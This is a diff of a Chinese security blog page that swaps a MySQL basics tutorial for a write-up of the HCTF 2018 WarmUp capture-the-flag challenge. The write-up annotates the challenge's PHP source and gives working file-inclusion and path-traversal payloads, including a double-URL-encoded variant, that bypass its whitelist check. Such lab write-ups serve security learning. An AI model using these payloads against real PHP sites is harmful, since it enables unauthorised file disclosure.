@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="MySQL基础, lunan">
+    <meta name="keywords" content="Web5 HCTF 2018：WarmUp, lunan">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>MySQL基础 | lunan</title>
+    <title>Web5 HCTF 2018：WarmUp | lunan</title>
     <link rel="icon" type="image/png" href="/lunan0320.github.io/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/lunan0320.github.io/libs/awesome/css/all.css">
@@ -262,12 +262,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/lunan0320.github.io/medias/featureimages/0.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/lunan0320.github.io/medias/featureimages/23.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">MySQL基础</h1>
+                    <h1 class="description center-align post-title">Web5 HCTF 2018：WarmUp</h1>
                 </div>
             </div>
         </div>
@@ -383,8 +383,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/lunan0320.github.io/tags/Web%E5%9F%BA%E7%A1%80/">
-                                <span class="chip bg-color">Web基础</span>
+                            <a href="/lunan0320.github.io/tags/Web/">
+                                <span class="chip bg-color">Web</span>
                             </a>
                         
                     </div>
@@ -399,7 +399,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-01-25
+                    2021-01-28
                 </div>
                 
 
@@ -413,14 +413,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.3k
+                    1.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    4 分
                 </div>
                 
 
@@ -440,176 +440,109 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1><span id="mysql学习笔记">MySQL学习笔记</span></h1><h2><span id="sql-structure-quevy-language-结构化查询语言">SQL: Structure Quevy Language    (结构化查询语言)</span></h2><!-- toc -->
+                <h1><span id="hctf-2018warmup">HCTF 2018：WarmUp</span></h1><p><strong>题目来源：BUUCTF</strong></p>
+<p>首先打开题目，url查找index.php时发现了一张滑稽的图片，此时查看源码发现source.php文件，直接访问得到界面源码。</p>
+<p><img src="/lunan0320.github.io/2021/01/28/web5-hctf-2018-warmup/1.png"></p>
+<p><img src="/lunan0320.github.io/2021/01/28/web5-hctf-2018-warmup/2.png"></p>
+<p>显然需要我们进行代码审计，分析源码。</p>
+<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">class</span> <span class="token class-name">emmm</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span> 
+        <span class="token comment" spellcheck="true">//传入了变量page，也就是我们刚刚传进来的file</span>
 
-<ul>
-<li><a href="#%E4%B8%80-%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86">一、基本知识</a></li>
-<li><a href="#%E4%BA%8C-%E6%95%B0%E6%8D%AE%E8%A1%A8%E6%93%8D%E4%BD%9C">二、数据表操作</a></li>
-<li><a href="#%E4%B8%89-%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5">三、查询语句</a></li>
-<li><a href="#%E5%9B%9B-%E6%8E%92%E5%BA%8F">四、排序</a></li>
-<li><a href="#%E4%BA%94-%E6%95%B0%E6%8D%AE%E5%AE%8C%E6%95%B4%E6%80%A7">五、数据完整性</a></li>
-<li><a href="#%E5%85%AD-%E5%85%B6%E4%BB%96%E6%93%8D%E4%BD%9C">六、其他操作</a></li>
-</ul>
-<!-- tocstop -->
+        <span class="token punctuation">{</span>
+            <span class="token comment" spellcheck="true">// 这里定义了白名单,包括source.php和hint.php</span>
+            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 
-<h3><span id="一-基本知识">一、基本知识</span></h3><blockquote>
-<h6><span id="ddl数据定义语言">DDL:数据定义语言</span></h6><p>DML:数据操作语言   –操作数据库表中的记录<br>DQL:数据查询语言<br>DCL:数据控制语言    –定义访问权限和安全级别 </p>
-</blockquote>
-<h4><span id="1-登录方式">1、登录方式</span></h4><pre class=" language-mysql"><code class="language-mysql">mysql -uroot -p123456                                   -- 123456是密码
-alter user'root'@'localhost'indentified by'新密码';       -- 更改密码
-mysqladmin -u root -p password 123456                      -- 在命令行中更改密码</code></pre>
-<h4><span id="2-数据类型">2、数据类型</span></h4><p>数值类型：double/int/float                </p>
-<p>eg:double(5,2)最多有五位，必须有两位小数，最大值：999.99</p>
-<h4><span id="3-字符串类型">3、字符串类型</span></h4><p>varchar/char/tinytext</p>
-<h4><span id="4-日期和时间类型">4、日期和时间类型</span></h4><p>DATE,TIME,YEAR</p>
-<p><strong>*字符串类型和日期类型都要用单括号括起来，’2020-01-01’<br>*</strong>一列是一个字段，一行是一条记录</p>
-<h3><span id="二-数据表操作">二、数据表操作</span></h3><h4><span id="1-建立数据表">1、建立数据表</span></h4><pre class=" language-mysql"><code class="language-mysql">create table teacher(                -- 创建teacher表
-    id int(4) not null primary key auto_increment,
-    name char(20) not null,
-    sex char(10) not null,
-    addr char(20) not null
-);
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token comment" spellcheck="true">/*为了返回 true 两个条件必须满足
+                1 page存在 
+                2 page是字符串 ，
+                这里和外层的判断file 一致基本是再次判断了一遍*/</span>
+                <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>
+                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
 
-create table student(
-    id bigint,
-    name varchar(20),
-    email varchar(20),
-    age int
-);</code></pre>
-<h4><span id="2-显示表结构">2、显示表结构</span></h4><pre class=" language-mysql"><code class="language-mysql">show tables;  -- 需要当前use teacher
-desc teacher  -- 或者使用desc查看表的字段信息</code></pre>
-<h4><span id="3-插入数据">3、插入数据</span></h4><pre class=" language-mysql"><code class="language-mysql">-- insert into 表名(字段1，字段2........) value(列值1，列值2......); 
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token comment" spellcheck="true">/*in_array(search,array,type) 函数搜索数组中是否存在指定的值，
+            白名单过滤，需要返回了ture
+            所以这里我们传入的page或者是经过截断之后的page必须是soure.php或hint.php，
+            这里是正常的访问，我们需要构造文件任意包含，所以这里传入的不满足条件，这里不是注意的点，往下继续看*/</span>
 
-INSERT INTO teacher(name,sex,addr) VALUES('Leo','Male','hangzhou');        
--- 或者插入多条记录：
-insert into 表名(字段1，字段2........) value(列值1，列值2......)，(列值1，列值2......)，(列值1，列值2......); 
-INSERT INTO teacher(name,sex,addr) VALUES('Able','Male','beijing');
-INSERT INTO teacher(name,sex,addr) VALUES('John','Male','shanghai');
-INSERT INTO teacher(name,sex,addr) VALUES('Mary','Female','hangzhou');</code></pre>
-<h3><span id="三-查询语句">三、查询语句</span></h3><h4><span id="1-基础查询语句">1、基础查询语句</span></h4><pre class=" language-mysql"><code class="language-mysql">SELECT * FROM teacher;                      -- 返回整个表的虚拟的结果集（存放在内存中）
-select stu_name,stu_age from students;      -- 查询指定的列</code></pre>
-<p><strong>–查询学号为1001，1002，1003的记录</strong></p>
-<pre class=" language-mysql"><code class="language-mysql">select * from teacher where id=1001 or id=1002 or id=1003;
-select * from teacher where id in (1001,1002,1003);  
+            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span> 
+                <span class="token variable">$page</span><span class="token punctuation">,</span>
+                <span class="token number">0</span><span class="token punctuation">,</span>
+                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span>  <span class="token string">'?'</span><span class="token punctuation">)</span>
+            <span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token comment" spellcheck="true">/*这里mb_substr 是个截断，返回0到mb_strpos之间的内容，而mb_strpos 则是查找第一次出现的位置，所以基本可以理解为获取page 两个？之间的字符串，也就是获取file两个？之间的字符串，放到url中就是http://ip/?file=ddd?中的file=ddd*/</span>    
+
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token comment" spellcheck="true">//这里和上面类似 查看_page 是否在白名单中</span>
+
+            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 这里发现对_page进行了一次decode解码，</span>
+            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>            <span class="token comment" spellcheck="true">//获取两个？？之间的内容</span>
+                <span class="token variable">$_page</span><span class="token punctuation">,</span>
+                <span class="token number">0</span><span class="token punctuation">,</span>
+                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>
+            <span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token comment" spellcheck="true">//先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为'?'，仍可通过第四个if语句校验。（'?'两次编码值为'%253f'），构造url：</span>
+            <span class="token comment" spellcheck="true">// 这里是我们要绕过的点，从这里往上看 尝试构造</span>
+
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//白名单</span>
+                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        exit<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token comment" spellcheck="true">/*必须满足if条件，才能包含file，这里也可以猜到可能考的是文件包含： 
+        1 REQUEST['file']不为空 
+        2 REQUEST['file']是字符串
+        3 checkFile($_REQUEST['file']) 为ture，回到checkFile 函数分析如何返回true*/</span>    
+<span class="token delimiter">?></span></code></pre>
+<p>整体利用的漏洞就是代码最后的include函数，利用<strong>文件包含漏洞</strong>，也就是需要include ffffllllaaaagggg文件，而且需要使用../来绕过</p>
+<p>此时我们不妨去查看一下hint.php中的内容，<code>/index.php?file=hint.php</code> <strong>是一个文件包含</strong>，<code>source.php</code> 是 <code>index.php</code> 的源代码</p>
+<p>可以得到提示，flag 在 <code>ffffllllaaaagggg</code> 里，但此时我们不知道flag的具体目录层次，因此构造时候需要通过</p>
+<pre class=" language-php"><code class="language-php"><span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>file<span class="token operator">=</span>source<span class="token punctuation">.</span>php<span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>ffffllllaaaagggg</code></pre>
+<p>依次通过../../构造尝试，去查看到底是几层的根目录。</p>
+<p>尝试后，成功构造出payload如下：</p>
+<pre class=" language-php"><code class="language-php">index<span class="token punctuation">.</span>php<span class="token operator">?</span>file<span class="token operator">=</span>source<span class="token punctuation">.</span>php<span class="token operator">?</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>ffffllllaaaagggg
+
+    <span class="token comment" spellcheck="true">/*payload执行流程：此时file=source.php?../../../../../../ffffllllaaaagggg
+第1个if返回false
+第2个if返回false
+$_page=source.php
+第3个if返回true，退出checkFile函数，此时核心代码中已满足if(true&amp;&amp;true&amp;&amp;true)，即执行include函数
+最后include(source.php?../../../../../../ffffllllaaaagggg)*/</span></code></pre>
+<p>即可得到flag：</p>
+<p><img src="/lunan0320.github.io/2021/01/28/web5-hctf-2018-warmup/4.png"></p>
+<p><strong>疑惑</strong>：为什么urldecode没有用到？查看网上很多的wp用到了，但这也是多此一举了，最后目标其实是一样的，checkFile返回true就可以</p>
+<p> 分析：例如用到urldecode的payload：</p>
+<pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//111.198.29.45:56708/index.php?</span>
+file<span class="token operator">=</span>source<span class="token punctuation">.</span>php<span class="token operator">%</span>253f<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>ffffllllaaaagggg
 </code></pre>
-<p><strong>–查询name为null的记录</strong></p>
-<pre class=" language-mysql"><code class="language-mysql">select * from teacher where name is null;
-
-</code></pre>
-<p><strong>–查询性别不为男的记录</strong></p>
-<pre class=" language-mysql"><code class="language-mysql">select * from teacher where gender!='男';</code></pre>
-<p><strong>–查询年龄在18到20之间的记录</strong></p>
-<pre class=" language-mysql"><code class="language-mysql">select * from teacher where age between 18 and 20; 
-select * from teacher where age>=18 and age <=20;< code></=20;<></code></pre>
-<h4><span id="2-模糊查询">2、模糊查询</span></h4><p><strong>–查询姓名由5个字母构成的学生记录</strong></p>
-<pre class=" language-mysql"><code class="language-mysql">select stu_name from students where name like '_____';    
--- 五个下划线，_表示的是任意一个字符</code></pre>
-<p><strong>–查询姓名由5个字母构成的学生记录，并且最后一个字母是s</strong></p>
-<pre class=" language-mysql"><code class="language-mysql">select stu_name from students where name like 's';    -- 四个下划线</code></pre>
-<p><strong>–查询姓名以‘m’开头的学生记录</strong></p>
-<pre class=" language-mysql"><code class="language-mysql">SELECT * FROM teacher where name like 'm%';         -- %表示任意多个字符</code></pre>
-<p><strong>–字段控制查询</strong></p>
-<p><strong>–去重操作</strong> </p>
-<pre class=" language-mysql"><code class="language-mysql">select distinct stu_name from students ;</code></pre>
-<p><strong>–对查询字段运算</strong></p>
-<pre class=" language-mysql"><code class="language-mysql">select * ,age+score from students;  
--- 生成新的一个字段，名称为age+score，字段的内容为age+score的值
-
-SELECT * ,IFNULL(age,0)+IFNULL(scoore,0) FROM students;
-SELECT * ,IFNULL(age,0)+IFNULL(scoore,0) AS total FROM students;  
--- 列名更改为total</code></pre>
-<hr>
-<h3><span id="四-排序">四、排序</span></h3><h4><span id="1-基础排序">1、基础排序</span></h4><pre class=" language-mysql"><code class="language-mysql">SELECT * FROM employee ORDER BY salary;         -- 按照salary字段的升序排序
-SELECT * FROM employee ORDER BY salary DESC;    -- 按照salary字段的降序排序
-SELECT * FROM employee ORDER BY salary DESC，id DESC;
--- 按照salary字段的降序排序,如果salary相等，按照id的降序排序。</code></pre>
-<h4><span id="2-聚合函数">2、聚合函数</span></h4><pre class=" language-mysql"><code class="language-mysql">SELECT COUNT(*) FROM employee;
-SELECT COUNT(performance) FROM employee;</code></pre>
-<p><strong>–统计月薪和绩效之和大于5000的人数个数</strong></p>
-<pre class=" language-mysql"><code class="language-mysql">SELECT COUNT(*) FROM employee WHERE IFNULL(salary,0)+IFNULL(performance,0) >5000;</code></pre>
-<p><strong>–统计月薪之和</strong></p>
-<pre class=" language-mysql"><code class="language-mysql">SELECT SUM(salary+IFNULL(performance,0)) FROM employee;</code></pre>
-<p><strong>–统计平均月薪</strong></p>
-<pre class=" language-mysql"><code class="language-mysql">SELECT AVG(salary) FROM employee;</code></pre>
-<p><strong>–统计最大值和最小值</strong></p>
-<pre class=" language-mysql"><code class="language-mysql">SELECT MAX(salary),MIN(salary) FROM employee;</code></pre>
-<h4><span id="3-分组查询">3、分组查询</span></h4><blockquote>
-<p><strong>having是在分组之后进行过滤，后面可使用聚合函数</strong></p>
-<p><strong>where是在分组之前进行过滤</strong></p>
+<p>执行流程：</p>
+<blockquote>
+<p>第1个if返回false</p>
+<p>第2个if返回false<br>$_page=source.php%3f../../../../../ffffllllaaaagggg<br>第3个if返回 false<br>urldecode执行后，$_page=source.php?../../../../../ffffllllaaaagggg<br>执行mb_substr后$_page=source.php<br>return true<br>下面核心代码执行同理<br>最后include(source.php%253f../../../../../ffffllllaaaagggg)</p>
 </blockquote>
-<pre class=" language-mysql"><code class="language-mysql">SELECT department,GROUP_CANCAT(`name`) FROM employee GROUP BY department;
-
--- 通过GROUP_CONCAT()来查看分开的记录，作为输出字段来显示</code></pre>
-<pre class=" language-mysql"><code class="language-mysql">SELECT department ,GROUP_CONCAT(salary) from employee where salary between 1500 and 2000 GROUP BY department;</code></pre>
-<p><strong>–查询工资总和大于9000的部门名称</strong></p>
-<pre class=" language-mysql"><code class="language-mysql">SELECT department,GROUP_CONCAT(salary),SUM(salary) FROM employee GROUP BY department HAVING SUM(salary) >=9000;</code></pre>
-<p><strong>–查询工资大于2000，工资总和大于6000的部门名称和工资和,并按照降序排序</strong></p>
-<pre class=" language-mysql"><code class="language-mysql">SELECT department,GROUP_CONCAT(salary),SUM(salary) FROM employee where salary>2000 GROUP BY department HAVING SUM(salary)>6000 ORDER BY SUM(salary) DESC;
-
--- LIMIT 使用</code></pre>
-<pre class=" language-mysql"><code class="language-mysql">SELECT * FROM employee LIMIT 3,3;
--- 从表中取出4，5，6行的数据  LIMIT的第一个参数是从哪一行开始查，第二个参数是一共要查几行</code></pre>
-<p><strong>–分页过程</strong></p>
-<pre class=" language-mysql"><code class="language-mysql">SELECT * FROM employee LIMIT (cur_page-1)*pageSize,pageSize;</code></pre>
-<h3><span id="五-数据完整性">五、数据完整性</span></h3><blockquote>
-<p><strong>实体完整性（表中一条记录就是一个实体）</strong></p>
-<p><strong>域完整性</strong></p>
-<p><strong>引用完整性</strong></p>
-</blockquote>
-<h4><span id="1-实体完整性">1、实体完整性</span></h4><p><strong>约束类型：主键约束，唯一约束，自动增长约束</strong></p>
-<h5><span id="11主键约束primary-key">1.1主键约束primary key</span></h5><p>每个表中要有一个主键，数据唯一且不为null</p>
-<pre class=" language-mysql"><code class="language-mysql">CREATE TABLE 表名（字段1，数据类型，PRIMARY KEY ,字段2 数据类型，字段3...........）             -- 定义主键</code></pre>
-<pre class=" language-mysql"><code class="language-mysql">CREATE TABLE 表名（字段1，数据类型,字段2 数据类型，字段3,数据类型，PRIMARY KEY（字段1，字段2））
--- 联合主键</code></pre>
-<pre class=" language-mysql"><code class="language-mysql">ALTER TABLE student ADD CONSTRAINT PRIMARY KEY(ID);
--- 添加主键</code></pre>
-<h5><span id="12唯一约束">1.2唯一约束</span></h5><p><strong>数据不能重复，可以为空</strong></p>
-<p>CREATE TABLE 表名（字段1，数据类型，字段2，数据类型，UNIQUE）</p>
-<p><strong>– 自动增长列（通常把主键设置为自动增长列）</strong><br>        指定列的数据自动增长，即使删除数据，序号也是继续向下增长</p>
-<pre class=" language-mysql"><code class="language-mysql">CREATE TABLE student(
-    id int PRIMARY KEY,auto_increment,
-    name varchar(20) UNIQUE
-);</code></pre>
-<h4><span id="2-域完整性">2、域完整性</span></h4><pre class=" language-mysql"><code class="language-mysql">CREATE TABLE stu(
-    id int PRIMARY KEY auto_increment,
-    name varchar(20) UNIQUE NOT NULL,
-    gender CHAR(1) DEFAULT '男'
-);</code></pre>
-<h3><span id="六-其他操作">六、其他操作</span></h3><h4><span id="1-更新数据修改表的列名">1、更新数据（修改表的列名）</span></h4><pre class=" language-mysql"><code class="language-mysql">UPDATE teacher set name = 'lunan' where id =1;          
-
-update student set stu_age=20,stu_score=70 where stu_name='ls';    
--- 把姓名为李四的年龄改为20，分数改为70
-
-alter table student change stu_name s_name varchar(30);   
--- 更改列名 从stu_name改为s_name</code></pre>
-<h4><span id="2-删除操作">2、删除操作</span></h4><pre class=" language-mysql"><code class="language-mysql">DELETE FROM teacher where name='John';  
--- 删除teacher表中字段名为John的一列
-
-alter table teacher drop John;        
--- 删除teacher表中字段名为John的一列
-
-drop table teacher；               -- 删除teacher表,表就不存在了
-delete from teacher;            -- 删除表的内容，表依然存在，id累加，从下一个开始
-truncate table teacher;            -- 直接先drop一个表，然后再创建一个同样的新表，内容是空的，id从1开始，速度比delete快</code></pre>
-<h4><span id="3-扩展">3、扩展</span></h4><p><strong>–完整创建表，并添加数据：</strong></p>
-<pre class=" language-mysql"><code class="language-mysql">create table student(
-    id int(4) not null primary key auto_increment,
-    name char(20) not null,
-    sex char(10) not null,
-    addr char(20) not null
-);
-INSERT INTO student(name,sex,addr) VALUES('nanlu','Male','hangzhou');
-INSERT INTO student(name,sex,addr) VALUES('Peter','Male','beijing');
-INSERT INTO student(name,sex,addr) VALUES('Sarah','Male','shanghai');
-INSERT INTO student(name,sex,addr) VALUES('Lossy','Female','hangzhou');</code></pre>
-<p><strong>–给一个表添加新的一列</strong></p>
-<pre class=" language-mysql"><code class="language-mysql">alter table student add stu_gender tinyint;
--- alter table 表名 add 列名 数据类型；</code></pre>
-<p><strong>–修改表中某个字段的类型</strong>        </p>
-<pre class=" language-mysql"><code class="language-mysql">-- alter table 表名 modify 字段名 数据类型；
-alter table student modify stu_name varchar(30); -- 将stu_name字段的长度改成30</code></pre>
-<p><strong>–重命名表明</strong></p>
-<pre class=" language-mysql"><code class="language-mysql">rename table student to newstu;        -- rename table 原始表名 to 改后的表名；</code></pre>
+<h4><span id="注意">注意：</span></h4><p>（1）只要函数中return执行了，就会立即结束函数的执行，继续执行函数外的代码<br> （2）||表示任意||两边只要有一边是true，整体就返回true<br> （3）in_array函数是检查数组中是否存在某个值(找到true；找不false),特别注意这是在数组的键值中找，不包括键<br> （4）mb_strpos查找目标首次出现的位置，从0开始<br> （5）mb_substr返回字符串，特别注意的是：mb_strpos获取的数字，在mb_substr不是从0开始，而是代表返回的长度</p>
 
                 
             </div>
@@ -636,7 +569,7 @@ alter table student modify stu_name varchar(30); -- 将stu_name字段的长度�
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://lunan0320.github.io/lunan0320.github.io/2021/01/25/mysql-ji-chu/">https://lunan0320.github.io/lunan0320.github.io/2021/01/25/mysql-ji-chu/</a>
+                    <a href="https://lunan0320.github.io/lunan0320.github.io/2021/01/28/web5-hctf-2018-warmup/">https://lunan0320.github.io/lunan0320.github.io/2021/01/28/web5-hctf-2018-warmup/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -674,8 +607,8 @@ alter table student modify stu_name varchar(30); -- 将stu_name字段的长度�
                     
                         <div class="article-tag">
                             
-                                <a href="/lunan0320.github.io/tags/Web%E5%9F%BA%E7%A1%80/">
-                                    <span class="chip bg-color">Web基础</span>
+                                <a href="/lunan0320.github.io/tags/Web/">
+                                    <span class="chip bg-color">Web</span>
                                 </a>
                             
                         </div>
@@ -723,13 +656,13 @@ alter table student modify stu_name varchar(30); -- 将stu_name字段的长度�
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/lunan0320.github.io/2021/01/26/sql-zhu-ru-wan-neng-yu-ju/">
+                <a href="/lunan0320.github.io/2021/01/29/web6-actf2020-xin-sheng-sai-include/">
                     <div class="card-image">
                         
                         
-                        <img src="/lunan0320.github.io/medias/featureimages/9.jpg" class="responsive-img" alt="SQL注入万能语句">
+                        <img src="/lunan0320.github.io/medias/featureimages/12.jpg" class="responsive-img" alt="Web6 [ACTF2020 新生赛]Include">
                         
-                        <span class="card-title">SQL注入万能语句</span>
+                        <span class="card-title">Web6 [ACTF2020 新生赛]Include</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -740,7 +673,7 @@ alter table student modify stu_name varchar(30); -- 将stu_name字段的长度�
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-01-26
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-01-29
                         </span>
                         <span class="publish-author">
                             
@@ -753,8 +686,8 @@ alter table student modify stu_name varchar(30); -- 将stu_name字段的长度�
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/lunan0320.github.io/tags/Web%E5%9F%BA%E7%A1%80/">
-                        <span class="chip bg-color">Web基础</span>
+                    <a href="/lunan0320.github.io/tags/Web/">
+                        <span class="chip bg-color">Web</span>
                     </a>
                     
                 </div>
@@ -768,13 +701,13 @@ alter table student modify stu_name varchar(30); -- 将stu_name字段的长度�
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/lunan0320.github.io/2021/01/25/java-ji-chu-yu-fa/">
+                <a href="/lunan0320.github.io/2021/01/27/mu-ma-getshell/">
                     <div class="card-image">
                         
                         
-                        <img src="/lunan0320.github.io/medias/featureimages/8.jpg" class="responsive-img" alt="Java基础语法">
+                        <img src="/lunan0320.github.io/medias/featureimages/18.jpg" class="responsive-img" alt="木马getshell">
                         
-                        <span class="card-title">Java基础语法</span>
+                        <span class="card-title">木马getshell</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -785,7 +718,7 @@ alter table student modify stu_name varchar(30); -- 将stu_name字段的长度�
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-25
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-27
                             </span>
                         <span class="publish-author">
                             
